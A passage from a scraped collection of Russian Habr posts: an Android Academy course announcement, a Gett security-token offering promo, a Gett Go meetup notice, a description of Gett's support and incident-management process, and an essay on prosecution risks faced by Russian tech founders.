выбрали следующие темы для программы курса.\n\n\nAdvanced Multithreading\nOptimizations\nAdvanced & Secure Networking\nAdvanced Architecture\nDI: How to and why\nAndroid Internals\n\r\nВ отличие от курса прошлого года, не будет домашних заданий, но будет больше интерактива во время самих лекций — вопросы не только от вас, но и от лекторов вам, небольшие тесты для контроля себя, обсуждения. \n\nКогда\r\nКурс будет проходить с середины июля по конец октября. На первые три лекции Авито снова приглашает нас к себе, а про локации второй половины курса мы расскажем в процессе. \n\r\nВсе лекции проходят оффлайн, но наше общение на это не заканчивается — для участников есть место для общения онлайн. В этом году мы решили переместиться в Телеграм, и для вас открыты канал с анонсами и чат для общения и вопросов.\n\nДля кого\r\nКурс Advanced года будет более специализированным, чем Fundamentals, и мы будем углубленно рассказывать про вещи, которые важно знать продолжающему развиваться разработчику. \n\r\nПоэтому от вас мы ждем, что:\n\n\nвы уже написали одно или несколько своих приложений или работаете джуниором и хотите развиваться дальше,\nвы знаете, что такое архитектура в программировании, для чего нужна, знаете зачем и как делить архитектуру на слои,\nили вы прошли курс Android Fundamentals и хотите продолжить обучение.\n\n\n\nКто мы такие\n\nЙонатан Левин, monday.com\n\r\nСтартапист до мозга костей. Основатель Глобальной Android Academy и лидер сообщества. Йонатан возглавляет отдел мобильной разработки в быстро растущем стартапе monday.com. В прошлом возглавлял стартап в области генетики а до этого являлся Android Tech Lead в компании Gett почти с основания. Очень любит выступать по всему миру и делиться своими знаниями в области предпринимательства, мобильной разработки и жизни в целом ;)\n\n\n Алексей Быков, Revolut\n\r\nЗанимается android-разработкой с 2016 года. В данный момент — android разработчик в Revolut. Часто посещает тематические конференции и встречи, иногда в качестве спикера. Входит в программный комитет конференции AppsConf.\n\n\nАлександр Блинов, HeadHunter\n\r\nРуководитель android-направления в группе компаний Headhunter. Редактор и ведущий Android Dev Podcast. Занимается Android-разработкой с 2011 года. Выступал с докладами на многих конференциях, в том числе Mobius, Dump, Droidcon Moscow, Appsconf, Mosdroid, Devfest-ы в различных городах России. \n\r\nДля Александра очень важно развитие команды, компании и android-сообщества. Он говорит про себя, что каждый день просыпается с мыслью: «Что я могу улучшить сегодня?».\n\n\nДмитрий Мовчан, Kaspersky\n\r\nРазрабатывает под Android с 2016 года, окончил МГТУ им. Баумана и двухгодичную программу «Системный архитектор» в Технопарке от Mail.ru. На данный момент является разработчиком антивируса под Android в Kaspersky (Kaspersky Internet Security for Android). В последнее время увлекся выступлениями, среди которых есть выступления на конференциях Mobius, AppsConf, Kaspersky Android Night. \n\n\nАлёна Манюхина, Yandex\n\r\nЯ разрабатываю под Android с 2015 года. В 2016 году окончила Школу Мобильной Разработки в Яндексе, где и работаю с тех пор в команде Авто.ру. В 2017-18 гг. участвовала в ШМР в качестве ментора и лектора, а в прошлом году мне довелось присоединиться к команде Android Academy в тех же ролях. В Academy меня привлек драйв, такой же, какой был в ШМР, только для большего количества человек! Это очень круто.\n\n\nПавел Стрельченко, HeadHunter\n\r\nРазрабатывает под Android с 2015 года. В hh.ru занимается поддержкой основных приложений, а также разработкой внутренних инструментов. Интересуется разработкой плагинов под Android Studio, вопросами архитектуры приложений, нейронными сетями.\n\n\n\nСергей Гарбар, Go Lama\n\r\nРазрабатывает под Android с 2013 года. Долгое время работал в аутсорс-компаниях, сейчас занимается продуктовой разработкой в golama (приложения для клиентов и для курьеров). Начинал с десктопных приложений на Java (да, и такие тоже бывают!), но однажды решил написать для себя приложение «напоминалку» под Android и не смог остановится.\n\n\nКак присоединиться\r\nРегистрация доступна по ссылке. Если вы уже освоились в android-разработке и готовы учиться дальше, или хотите проверить, насколько хорошо вы знаете темы из программы, или просто хотите хорошо провести время в сообществе разработчиков, мы ждем вас в Academy!\n\n\n\r\n→ Канал с новостями\r\n→ Общий чат\r\n→ Канал с лекциями на Youtube", {"day": "2", "month": "июля", "time": "13:14"}, {"rate": 15, "views": 4900}], ["Недавнее IPO такси-сервиса Lyft вызвало повышенный интерес инвесторов к сфере такси-сервисов. Однако помимо самого Lyft и Uber в ближайшее время крупные игроки этого рынка не планируют проводить IPO. К примеру, сервис Gett собирается выйти на биржу лишь в 2020 году. \n\r\nПри этом, инвестировать в компанию, входящую в топ-5 крупнейших в своей отрасли, можно и сейчас. Для этого используются токенизированные ценные бумаги (security-токены), привязанные к привилегированным акциям Gett. Поговорим о том, как все это работает.\n\nЧто такое токенизированные ценные бумаги\r\nSTO (security token offering) — это форма привлечения инвестиций, где объектом инвестирования являются токенизированные ценные бумаги (security-токены). По сути, это реальные акции компании, которые удостоверяют собственность владельца, дают право на дивиденды, долю от прибыли и т.п.\n\r\nНесмотря на то, что для выпуска подобных токенов используются технологии блокчейна и криптовалют, этот процесс регулируется государством. В случае предложения Gett, выпуск и оборот токенов происходит в соответствии с регулирующими нормами финансового рынка Евросоюза.\n\nКак это работает\r\nЦифровые ценные бумаги Gett получили название GTT. Они будут выпущены на платформе OKONTO в рамках соглашения с ITI Capital Limited.\n\r\nТокены будут обеспечены паями фонда DVC Drive Tech Fund SP (акционер Gett), который управляется Da Vinci Capital Management Limited, и привязаны к привилегированным акциям компании Gett. Это значит, что в случае проведения компанией IPO, security токены будут (при условии соответствующих действий третьих лиц) конвертированы в акции компании Gett. Также токены GTT можно будет обменять по текущей биржевой цене при условии возможности осуществления торгов.\n\nСтоимость токенов, права инвесторов\r\nПриобрести токенизированные ценные бумаги можно будет в рамках проведения STO, начало которого намечено на 28 июня. Проводится оно будет на сайте платформы OKONTO. \n\r\nМинимальный размер инвестиции для всех классов инвесторов составляет 415 евро.\n\r\nP.S. В четверг, 27 июня, в 11:30 состоится он-лайн пресс-конференция. Приглашаем к участию СМИ, финансовых блогеров и авторов телеграм-каналов. Для участия необходимо зарегитрироваться.", {"day": "25", "month": "июня", "time": "14:16"}, {"rate": 11, "views": 4900}], ["Всем привет, меня зовут Лера Лисичкина, я руковожу технологическим пиаром Gett в России. \n\r\nМы начали рассказывать о нашем московском офисе среди разработчиков не так давно – Gett RnD открылся чуть меньше двух лет назад, в сентябре 2017 года. \n\r\nС весны 2018 года мы активно принимаем участие в профильных ивентах, часто являемся генеральными спонсорами всей движухи вокруг русского Golang-коммьюнити – начиная от митапов на 200 человек и заканчивая GopherCon Russia 2018 и 2019.\n\n\n\r\nGett RnD в России сейчас расширяется, т.к. наша компания выходит на мировой корпоративный рынок. Нам постоянно требуются новые сильные разработчики, которые смогут быстро влиться в команду и начать продуктивно трудиться. \n\r\nИменно поэтому для нас лето – весьма жаркая пора не только температурным режимом воздуха.\n\r\nСовместно с сообществом GDG Nizhniy Novgorod мы организовываем митап по разработке на Go, на котором будут выступать три моих коллеги:\n\n\n1. Саша Грунин rootatdarkstar, разработчик на Go в команде B2B, который расскажет об ошибках использования ORM как в контексте разработки на Go, так и вне его, а также о рациональных практиках изоляции доступа к данным.\n2. Заур Абасмирзоев zaurio, глава домена (так у нас зовутся департаменты) Business Operations, продолжит тему Саши, и, углубляясь в практические кейсы, расскажет про библиотеку go-gad/sal, которая предлагает решение в виде генерирования однотипного кода на основе описанного интерфейса. Кстати, Заур подготовил это выступление по мотивам своей хабрастатьи «Генератор клиента к базе данных на Golang на основе интерфейса», так что если вы её ещё не читали, очень рекомендую.\n3. Влад Богомолов vladson4ik, системный архитектор, расскажет о том, как сделать механизм контроля работоспособности приложений для мультисервисной архитектуры в Kubernetes. \n\n\n\r\nВсе презентации докладов ребят я выложу в комментариях к этому посту после мероприятия. \n\r\nЕсли вы из Нижнего Новгорода, или вдруг хотите приехать к нам на митап, регистрируйтесь по этой ссылке: gdgnizhny.timepad.ru/event/997436\n\r\nОбещаем качественный контент и афтерпати после докладов :) \n\nПочему именно Golang у нас в приоритете? \r\nНаш технологический стек включает Golang, React.js, PostgreSQL, RabbitMQ, а также существует несколько проектов на Ruby on Rails.\n\r\nВ московском офисе Gett RnD, в основном, у нас базируется домен Business Operations, который включает в себя следующие команды – Billing, Fleet Portal, Customer Care, Fraud & Payments, Development и Infrastructure. Также есть команда B2B, которая занимается задачами, связанными с разработками решений для наших корпоративных клиентов. Компаний, подключенных к Gett B2B, на текущий момент уже более 20 тысяч. Плюс еще у нас есть небольшая (пока что) команда Growth, которая занимается разработкой сервисов для услуг доставки Gett Delivery. \n\r\nПодробнее о том, как все устроено в Gett RnD, мы напишем в наших следующих постах.", {"day": "24", "month": "июня", "time": "16:50"}, {"rate": 18, "views": 1700}], ["Привет! Меня зовут Виталий Костоусов, я работаю в команде Global Tech Heroes, и сегодня я расскажу вам о саппорте — об одной из самых важных составляющей любого сервиса. Можно сделать отличное приложение с прикольными картинками и иногда адекватно шутящими чат-ботами. Можно откровенно демпинговать, на первых порах предлагая клиентам сервис по заниженной цене. Можно нанять прекрасного SMM-щика, за которого не будет стыдно и которого не придется менять так же часто, как бухгалтера в 90-х.\n\r\nНо все это может хорошо споткнуться при отсутствии вменяемой поддержки вашего сервиса. Причем поддержки в глобальном смысле — от решения проблем пользователей до обеспечения работоспособности софта и железа. Ну серьезно, долго ли люди будут пользоваться приложением, которое уже пару недель тупит, а разработчики все еще нормально не среагировали на проблемы, служба поддержки отписывается роботизированными ответами, а в колл-центре можно часами бесплатно слушать классическую музыку? \n\n\n\r\nКак у нас все устроено, что мы используем в работе для обнаружения проблем и их решения, сколько нас всего и прочее — под катом.\n\r\nСейчас мы работаем в 3 странах: Россия, Великобритания и Израиль, и у нас сотни тысяч активных пользователей, одних только корпоративных клиентов более 20 000. Ежедневных запросов к нашим приложениям, как вы понимаете, хватает. А еще есть водители и запросы от них. А еще внутренние системы и мониторинг. Все это должно работать, и работать хорошо. Для этого у нас есть команда глобальной технической поддержки, именуемая внутри “Tech Heroes” — команды R&D, операторы и инженеры по эскалации, а также Global Incident Manager. И вот с чем они сталкиваются в работе.\n\nКоманда и пользователи\r\nСразу оговоримся, что под конечными пользователями нашей команды подразумеваются не только клиенты и водители, которые в приоритете (как частные, так и корпоративные), но и маркетинг, служба поддержки и наши внутренние департаменты. Само собой, в саппорт они пишут или с помощью приложения, или в социальные сети. Если проблема именно технического характера, то задача внутри SalesForce сразу отправляется к нам. Могут писать не только о приложении и качестве его работы в целом или каких-то функций в частности, но и о работоспособности внутренних сервисов компании. Есть более 1000 сотрудников Gett, которые задают вопросы о рабочем софте, организации процессов. \n\r\nВ нашей команде 8 человек, распределенных по трем странам — Израиль, Великобритания и Россия. Специалист из России работает удаленно, в его обязанности входит работа с операционными процессами: контроль и внесение изменений в наши основные сервисы. Остальные семеро занимаются и операционными вопросами, и многим остальным: тестированием, багами, спецификациями, оперативно решают обращения, которые поступают со стороны операционных специалистов и менеджеров, а также мониторят все наши БД, сервисы и микросервисы. Эта команда обрабатывает все тикеты, из какой бы страны они ни прилетали. По большей части работать приходится с локальными проблемами, но бывает такое, что находится какой-то серьезный баг в работе глобальных сервисов, тогда работа переходит в режим Global.\n\r\nЕще нужно учитывать, что у нас много b2b-клиентов по миру — в системе заложены очень гибкие настройки и возможности бизнес-интеграции с сервисами компании. То есть классов авто намного больше, чем видят частные пользователи сервиса. Важно понимать, что все это влияет как на работу сервисов, так и на количество транзакционных операций. B2B-сегменту доступно использование личного кабинета на сайте компании. \n\nСофт\r\nДля работы с тикетами на рынке существует несколько систем, которые уже доказали свою полезность: LiveAgent, ZenDesk, ZohoDesk и другие. Можно выбирать по удобству, можно по привычке, можно — отталкиваясь от того, с каким софтом работают коллеги, дабы не городить кучу прослоек и костылей (которые тоже придется поддерживать и допиливать). Поэтому мы работаем на SalesForce, так как его используют основные операционные направления компании (продажи и поддержка). Это позволяет отслеживать статус каждого кейса со стороны его создателя. Есть автоматическая приоритезация кейсов на основе тематик обращений. А еще SalesForce интегрирован в Jira и, если создан таск или заведен баг в разработку — его статус также отображается в кейсе. Так мы добиваемся прозрачной коммуникации между Поддержкой и Разработкой\n\n\nSalesForce, кликабельно\n\r\nВыделенная система заявок позволяет отслеживать SLA для каждого тикета, поступающего к нам.\n\nТикеты и запросы\r\nКонкретно наша команда занимается работой самого приложения (и для водителей, и для пассажиров), микросервисами, с которыми работают операционные специалисты, а также тестированием и мониторингом. Кроме этого, всегда есть запросы на новые отчеты и мониторинги, которые могут быть полезны коллегам из других департаментов. При этом некоторые мониторинги предназначены строго для нашей команды, если касаются исключительно технических параметров работы сервисов, баз данных. Часть мониторингов отправляет оповещения нам, ответственной команде и поддержке. Если проблема связана, например, с работой водительского приложения — поддержка гораздо быстрее отреагирует и оповестит водителей при необходимости. Таким образом, сроки информирования сокращаются до нескольких минут. \n\nМониторинг\r\nМониторингов у нас много. Как только один из них срабатывает, будь то newrelic (работоспособность системных служб), grafana (мониторинг конкретных сценариев), datadog (работоспособность компонентов инфраструктуры), нам сразу падает уведомление в Slack и мы по очереди получаем звоночек (спасибо pagerduty). И на определенный период времени назначается один дежурный. Так как это происходит автоматически, то есть вероятность, что именно этот назначенный человек прямо сейчас недоступен или просто не ответил, тогда звонок переадресуется дальше по цепочке. \n\r\nПри срабатывании алертов мы перепроверяем работоспособность систем и выясняем причину сбоя (или повышенной нагрузки, или большого количества ивентов или обращений, тут что прилетит). Если понимаем, что дело тут в какой-то проблеме и ее надо решать, то посылаем письмо на специальные группы рассылки для операционных спецов. \n\r\nПоэтому мы всегда онлайн.\n\nУправление инцидентами\r\nЕсли ваша компания предоставляет услуги, без управления инцидентами никуда. Мы работаем вот по такой схеме:\n\n\nСвоевременное обнаружение проблем.\nОповещение о проблеме ответственных лиц.\nОповещение о проблеме заинтересованных сторон на всех уровнях. То есть мы рассказываем о проблеме бизнесу, чтобы и там все понимали, как именно подобные проблемы сказываются на компании и прибыли.\nПоддержание максимальной прозрачности работы.\nОбязательный анализ первопричины. Ведь в ней истоки проблемы, и следующую можно будет предотвратить. Это быстрее и полезнее, чем снова решать ее по второму кругу.\n\r\nЦель — узнавать о проблемах на нулевых стадиях. Это когда о проблеме узнал именно ты как сотрудник, обеспечивающий работоспособность. А не когда тебе о ней сообщил клиент. Поэтому мы активно используем инструментарий APM (Application Performance Monitoring). Еще разок озвучу их.\n\nNewRelic\n\n\nМониторинг всех наших микросервисов и шлюзов\n50x, 4xx errors\nRedis Apdex\nDBs Apdex\n\n\nNewRelic, кликабельно\n\nGrafana. Events monitoring (дает понять что именно перестало работать или поведение отличается от нормального).\n\n\nGrafana, кликабельно\n\nDataDog. Мониторинг аппаратных компонентов нашей системы (БД, балансировщики нагрузки).\n\n\nDataDog, кликабельно\n\nAirBrake. Code Exceptions for apps / microservices (есть список исключений, например, при исполнении кода или запросов в базе, если что-то идет не так и это есть в списке – мы это отслеживаем).\n\nKibana — мониторинг логов микросервисов / приложений (водитель / клиент).\n\r\nА чтобы все работало не только на обнаружение, но и на своевременное оповещение (тут же чем быстрее — тем лучше), все это связано с рядом каналов уведомлений, от Slack и PagerDuty до старых добрых уведомлений по email. Поэтому о любых аномалиях узнает сразу вся команда. Оповещения можно отправлять в разные каналы. Критичные для работы приложений мониторинги всегда отправляют алерты в команду техсаппорта и выборочно в каналы команд разработки, ответственных за конкретные фичу / сервис. Все это способствует оптимизации временных затрат на реагирование\n\r\nСложности возникали на следующем шаге, когда после обнаружения проблемы тебе надо было быстро оповестить ответственного за сервис. А это не так просто сделать, если процессов и микросервисов много, значит, ответственных не меньше. А алерт может прилететь глубокой ночью, когда тебе хочется чего угодно, но точно не перебирать в голове, кто и за что отвечает.\n\r\nПоэтому мы создали удобный каталог с перечислением всех service owner-ов (вообще по всей компании). Как показала практика, одно это помогло нам сократить время решения каждого инцидента примерно на 20%.\n\r\nЛучший рецепт продолжающейся катастрофы в этом случае — это оставить инцидент без ответственного лица.\n\r\nСуществует специальный человек, Global Incident Manager, который работает как хаб для серьезных инцидентов. Он занимается контролем и изменением в основных системах для исключения ошибки, которая может привести к костам бизнеса, и отвечает уже перед первыми лицами компании, предоставляя им подробные отчеты по анализу первопричин.\n\r\nПоэтому, если коротко, сам процесс управления инцидентами выглядит так:\n\n\nОпределяем причины произошедшего.\nНаходим ответственное лицо.\nКоординируем с ним усилия по максимально быстрому исправлению проблемы.\nПринимаем все нужные решения во время инцидента.\nУведомляем об этом бизнес, доносим до них всю проблематику.\nКогда пыль рассеивается, запускаем анализ первопричин, RCA (Root Cause Analysis).\n\r\nОтчеты об инцидентах мы строим в Jira, есть соответствующий модуль, Incidents, мы вписали туда еще ряд дополнительных полей.\n\r\nЭтапов RCA всего три.\n\n1. Первоначальный RCA\n\r\nЭто самое верхнеуровневое описание причины проблемы (была ли это проблема с БД, или с инфраструктурой, или с кодом). Этот отчёт готовит тот сотрудник поддержки, который управлял инцидентом. Отчёт надо завершить в течение 24 часов после завершения инцидента.\n\n2. R&D RCA\n\r\nСамая важная часть процесса, надо заполнить в течение 48 часов после завершения инцидента. Здесь уже полный технический анализ первопричины — почему это случилось, почему не было обнаружено (проглядели тестировщики или нет соответствующего мониторинга), есть ли вероятность, что повторится, и что сделать, чтобы не повторялось.\n\n3. Действия\n\r\nНа основе второго пункта формируются соответствующие подзадачи, инцидент остается открытым, пока не закроют последнюю из этих подзадач. Никому не хочется, чтобы такая задачка долгое время занимала канбан, поэтому это мотивирует решать все побыстрее.\n\r\nВот так мы в Gett работаем с инцидентами. \n\nЦифры и технологии\r\nРаботаем, само собой, 24/7 с SLA 99.99%. Основной стек у нас на GoLang / Ruby, это дает необходимую скорость обработки сложных алгоритмов. Микросервисов суммарно более 150, и все они тоже на GoLang и Ruby. В качестве баз данных используем MySQL, Postgres, и Presto. Хранилище у нас на AWS.\n\r\nСамая серьезная нагрузка на наши сервисы приходится на новогодние каникулы и предшествующие им 2 недели. Также сказывается состояние конкурентов, к примеру, упало приложение у кого-то из них, значит, наши машины будут вызывать чаще. \n\r\nЕсть еще и пики внутренней работы, которые влияют на конечных пользователей. К примеру, когда мы обновляем БД или проводим технические работы на стороне поставщиков и вендоров, или деплоим новые сервисы на продакшн (не по пятницам, да), или вводим в эксплуатацию фичи, задевающие сразу большое количество пользователей или транзакций.\n\r\nМы тоже люди и иногда бывает так, что некорректные настройки или ручное вмешательство приводят к операционным ошибкам, поэтому разработали план и на такой случай:\n\n\n\r\nНет, не то. Вот:\n\n\nПроверяем данные в сервисах, логи и аудиты.\nТестируем и проводим операции обновления на Scrum-ах.\nГотовим таск для команды и мониторим выполнение задачи на продакшене. \n\r\nЕсли вам интересны какие-то детали, смело задавайте вопросы в комментариях, мы ответим или здесь же, или отдельным подробным постом.", {"day": "21", "month": "июня", "time": "12:56"}, {"rate": 35, "views": 5200}], ["Я — профессиональный участник инновационной индустрии. Вместе с коллегами последние 10 лет мы участвуем в создании новых технологий. \n\r\nИ я должен сказать о причине, по которой не стоит заниматься инновациями в России. Здесь можно порассуждать о плохом инвестиционном климате, неэффективности государственных программ, размере внутреннего рынка, смещенных мотивациях участников. Но кроме этого есть и плохо контролируемый риск, который заключается в возможности оказаться за решеткой. И об этом не принято говорить вслух, а нужно. Под катом топ-5 инновационных компаний по версии следственного комитета, известных мне, а их злоключения не были ранее упомянуты на хабре.\n\nМотивация\r\nПредупреждение: Для меня это личная история. Мой друг, который участвовал в создании по-настоящему конкурентной инновационной компании в качестве технического директора и сооснователя, сейчас находится в СИЗО. Но, несмотря на это, я постараюсь максимально неэмоционально описать и напомнить несколько историй, которые случались с основателями инновационных компаний в России, в отрасли, в которой мы работаем.\n\r\nЯ не думаю, что тут можно придумать какие-то правила гигиены, чтобы не попасть в похожие ситуации, но все же очень полезно держать в голове весь спектр рисков. Потому, если вы уже в этой отрасли или думаете податься в инноваторы, рекомендую к прочтению те примеры из нашей реальности, которые не упоминались на Хабре. \n\n“Я думал что”\r\nЯ хочу сразу сформулировать несколько утверждений, которые мне приходится иногда слышать от коллег, и впоследствии на примерах показать, что все из них неверны в нашей реальности:\n\n\nинновации то настоящие не тронут — мы же не мошенники такие, как все кругом; \nнас не будут трогать, ведь гос-во заинтересовано в нас — стратегическая отрасль, может даже с военными связаны, да и вообще все под контролем;\nпока мы маленькие и ниже радара, все будет хорошо, подрастем — будем думать.\nмы не будем вести дела напрямую с государством, только через пару посредников, нам ничего не угрожает;\nмы коммерческая компания, никак не касаемся гос-ва, хипстеры и смузи, работаем исключительно чисто, все будет хорошо;\nя не генеральный директор и не главный бухгалтер, вряд ли меня коснутся любые проблемы компании уголовного характера;\n\r\nПримерно такими стратегиями и руководствуются те, кого я спрашивал про риск не оказаться обвиненным в уголовном преступлении, делая инновационный бизнес в России.\r\nЯ подбирал примеры так, чтобы в каждом из них была реальная инновационная составляющая. \n\nТ-платформы\r\nГенеральный директор и основатель компании “Т-платформы” Всеволод Опанасенко был отправлен в СИЗО 26 марта 2019. \n\r\nТ-платформы — это компания, созданная в 2004 году и специализирующаяся на специальных вычислительных платформах. На слуху есть два их безусловных достижения: экспорт суперкомпьютеров в Германию, создание процессора Байкал и компьютеров на его основе (дочерним предприятием). \n\n\nИзображение из блога Zeptobars\n\r\nСогласно публикации в Ведомостях, его задержание связано с невыполнением обязательств по контракту поставки компьютеров в МВД, которое могло быть вызвано несвоевременно оплаченным авансом. Спор в арбитражном суде перешел в уголовную плоскость.\n\r\nОснователь оставался мажоритарным владельцем компании (что довольно необычно для компаний такого масштаба), создал на сегодня отечественный процессор (хоть долю “отечественности” можно оценивать по-разному, т.к. производство не в России) и конкурентный компьютер для офисных нужд (как по производительности, так и по цене), и все это на фоне импортозамещения в ПО в РФ и не самого лучшего состояния отрасли микроэлектроники.\n\r\nПочти наверняка арест основного владельца и генерального директора компании приведет к остановке развития “Т-платформы”, а может и просто к разрушению компании. \n\r\n“Стратегическая отрасль” — не помогает.\n\nЭКАТ\r\nЭКАТ — резидент Сколково с 2014 года, основатель компании Александр Макаров.  Последние новости, которые я нашел о состоянии уголовного дела от 10.2018.\n\r\nКомпания занимается термокаталитическими системами очистки газов, разрабатывают, производят и поставляют их конечным потребителям.\n\n\nСлайд открытой презентации с сайта www.slideshare.net \n\r\nНасколько я понимаю из описания их технологии, основная инновация заключается в использовании пеноматериалов для производства катализаторов. Технология производства подобных катализаторов (возможно, из разного состава для разных каталитических реакций) может быть действительно уникальной и инновационной. \n\r\nВ начале жизненного пути компании владельцу было предъявлено довольно парадоксальное обвинение. Через несколько лет после раунда инвестиций от государственного фонда оценка стоимости компании упала и фонд предложил выкупить 75% акций компании основателю за 6 млн.р. Все потери стоимости акций следствие посчитало хищением государственных средств, что создало бы жутковатый прецедент при условии, что большинство стартапов просто не удаются. Иными словами, соглашаясь на инвестиции от государственного фонда, можно ожидать следователей, если допустил снижение оценки стоимости компании.\n\r\nКак видите, компания была заметно ниже любого разумного “радара”, т.е. речь шла о совсем малом предприятии.\n\r\n“Ниже радара” — не помогает.\n\nBaring Vostok\r\nКажется, что все “дела инноваторов” будет объединять связь с государственными контрактами. Но это не так.\n\r\nИнвестиционные фонды — другой “фронт” инновационной отрасли, но они неразрывно связаны с технологическим развитием и инновациями. \n\r\nФонд Baring Vostok работал с компаниями в России и СНГ.\n\r\nКвалификацию и эффективность менеджмента характеризуют список компаний, в которые они инвестировали: Яндекс (35.7% акций в 2000 году, что позволило им заработать $ 4млрд.), Ozon.ru, СТС Медиа, 1С, Avito.ru, Tinkoff.ru, Gett, Вкусвилл, 2ГИС.\n\r\nПосле слияния банков “Восточный” (долей которого владел Baring Vostok) и “Юниаструм” менеджмент Baring Vostok обратился в Арбитражный суд Лондона из-за вывода из банка “Юниаструм” активов на 17.5млрд.р. перед слиянием новым директором объединенного банка “Восточный”. А он, в свою очередь, обратился в следственный комитет.\n\r\nМайкл Калви находится под домашним арестом.\r\nВ СИЗО:\r\nВаган Абгарян — партнер Baring Vostok\r\nФилипп Дельпаль — партнер Baring Vostok\r\nИван Зюзин — директор по инвестициям Baring Vostok\r\nАлексей Кордичев — бывший глава банка «Восточный» Алексей Кордичев\r\nМаксим Владимиров — гендиректор «Первого коллекторского бюро»\n\r\nПроблема трактовки в рамках уголовного кодекса состоит в том, что в состав преступной группы могут включать произвольных людей; не имеет значения, какая формальная должность была у сотрудника в компании, и был ли он вообще сотрудником или акционером.\n\r\nЯ не представляю, где теперь компании новой генерации смогут получать частные инвестиции второго-третьего раунда для масштабирования и развития бизнеса. После этого громкого дела не приходится надеяться на системную работу сопоставимого частного инвестфонда, а значит, придется привлекать все больше государственных средств (см. логику следствия в случае компании ЭКАТ).\n\r\n“Не ведем дела с государством” — не работает.\n\nСтриж Телематика\r\nИсторию этой компании, от которой впоследствии отделилась WavIoT, я знаю лично, т.к. хорошо знаком с Евгением Ахмадишиным, который являлся сооснователем компании и техническим директором в начальный этап развития “Стрижа”.\n\r\nИсточники информации о компании в википедии.\n\n\n\r\nМетоды приема сигнала в радио давно хорошо изучены, все сделано недалеко от оптимальности. Но в определенный момент времени сложились 3 фактора, которые позволили создать что-то новое и в этой отрасли:\n\n\nточность кварцевых генераторов постепенно повышалась и повышается, позволяя увеличить длительность когерентности сигнала;\nмощность излучателей (именно мощность, а не энергия на один бит информации) ограничена государственными законами настолько, что были проблемы с передачей сигнала на расстояния больше 100 метров для существующих радио протоколов;\nвозник рынок IoT устройств.\n\r\nВ “Стриж” разработали технологию приема и обработки сигналов, в которых 1 бит информации мог передаваться до 100мс. Вероятность же приема бита информации определяется соотношением сигнал-шум, в числителе которого стоит энергия сигнала (или мощность на полосу, что эквивалентно). За счет улучшения кварцевых генераторов, можно было сузить полосу передачи при прежнем ограничении на мощность сигнала, продлив длительность когерентности радио-сигнала.\n\r\nКроме того, полоса сигнала обработки за счет использования спецвычислителей и оригинального способа процессинга была около 1МГц. Один приемник позволял получать сигналы с тысяч и десятков тысяч датчиков (зависело от интенсивности передачи, но здесь дело обстояло даже лучше, чем в LoRa — из-за разделения по частоте). Малое потребление датчиков позволяло создавать достаточно компактные устройства, которые работают годами от автономных источников питания. На изображении пример датчика воды.\n\r\nВ целом, это отличный пример инновационной компании, которая могла быть создана в России. Здесь возможно найти квалификацию в области радио и математики, а эта квалификация была абсолютно необходима, чтобы создать конкурентную технологию. Лично меня еще поражало, что, помимо создания технологии, они смогли сделать продуктовое решение, в которое включалось все от прямых продаж жилищным управляющим компания до front-end-а клиентских приложений.\n\r\nЗатем компания разделилась на 3 бизнеса (Стриж Телематика, WavIoT, NWave), я не представляю как идут дела у каждой из них, но, насколько я слышал, продажи у всех растут и достигают уже миллиардных сумм в рублях у одной из компаний. NWave успешно ведет дела и привлекает инвестиции, базируется в Лондоне.\n\r\nТем временем, следствие возбудило дело из-за парковочных датчиков для московских парковок, которые были разработаны и произведены в “Стриже”. Компания получила контракт от ФГУП ФСО «Свэко», которое в свою очередь участвовало в госконтракте. Следствие сформулировало преступное сообщество, в которое включило и технического директора и сооснователя “Стриж” Евгения Ахмадишина. \n\r\nНа сегодня Евгений Ахмадишин находится в СИЗО более 1.5 лет, потеряв все, что строил. \n\r\n“Быть техническим директором” и “не исполнитель госконтракта” — не помогает.\n\nНовИТ ПРО\n\r\nИзображение взято из отличного рассказа о том, чем занимается компания\n\r\nКомпания разрабатывает 3D модели, необходимые для ремонта судов. Это огромная работа, которая включает в себя множество методов, позволяющих восстановить модели из конструкторской документации и реальных измерений объекта. Кроме того, одним из продуктов компании был мобильный центр сопровождения ремонта с элементами виртуальной реальности.\n\r\nВ целом, 3D моделирование, тренажеры для подготовки ремонтных бригад, планирования ремонта — это все современный подход к эффективному обслуживанию сложных и масштабных технических систем подобных морским судам и подводным лодкам.\n\r\nОчевидно, что компания опосредованно работала с государственными деньгами. \r\nВ рамках дела о хищениях при строительстве подводной лодки “Варшавянка”, директора и владельца компании Валерия Пшеничного задержали. Через три недели, проведенных в СИЗО, предпринимателя, похоже, пытали и убили. Официальное следствие утверждает о самоубийстве, специалисты бюро судебно-медицинской экспертизы (Санкт-Петербургское ГБУЗ БСМЭ) однозначное исключают эту версию. \n\r\n“Как вы ваши подводные лодки чинить будете” — тоже не работает.\n\nРиски выше\r\nКажется, что инновационная деятельность должна увеличивать публичность компании и в каком-то смысле гарантировать защиту от плохо обоснованных обвинений в уголовных преступлениях. Но у меня складывается впечатление, что работает это совершенно в обратном направлении — большая публичность привлекает и большее внимание следователей. Кроме того, возможно, больший шум вокруг уголовного дела каким-то образом помогает в продвижении во внутриведомственной иерархии, “раздувая” дело не деньгами, так известностью.\n\nТакже упомяну\r\nДаурия Аэроспейс — частная космическая компания, основатель Михаил Кокорич не в СИЗО, компания фактически прекратила свою деятельность. По его словам, создание компании в России было самой его большой ошибкой в жизни. \n\r\nДодо пицца — основателя вызывали на допрос из-за подозрений в организации наркоторговли. Исключительно коммерческая компания. Хочется думать, что кто-то просто слишком серьезно отнеслись к сериалу Breaking Bad. Но в тот день, когда я прочитал эту новость, я серьезно забеспокоился, не потеряем ли мы их отличнейшие пиццы.\n\nЗаключение\r\nЕсли вы основываете инновационный бизнес в России или просто принимаете в нем значимое участие в любом качестве, вы рискуете оказаться в тюрьме даже больше, чем в случае бизнеса, не имеющего признаков инновационности. Риски проблем с продуктом после релиза/продажи выше. Следствию будет легче манипулировать понятиями стоимость компании и ее продуктов, величина ущерба будет всегда “особо-крупной”. Т.е. у вас будет уникальное предложение на рынке, но его цена будет “явно завышена”. \n\r\nИ еще, имея дело с государством, даже не допускайте мысли “оно же им самим надо”:\n\n\nДатчики “Стриж Телематика” были срезаны дорожными службами при перекладке асфальта через пару лет почти все \nМВД отказалось принимать поставку компьютеров в случае “Т-платформы”\n\r\nМы часто имеем дело с компаниями, создающими биометрически решения. Эта отрасль в России сейчас просто драйвер для воспитания новых прикладных специалистов в компьютерном зрении и Deep learning. Но я почти уверен, что все то оборудование, что может помогать ловить преступников или лучше контролировать госграницу, не будет обслуживаться должным образом или не будет включено в информационные системы. Что выльется в уголовные дела.\n\r\nЯ думаю, можно накопать множество вопиющих примеров, когда создатели уникальных технологий или 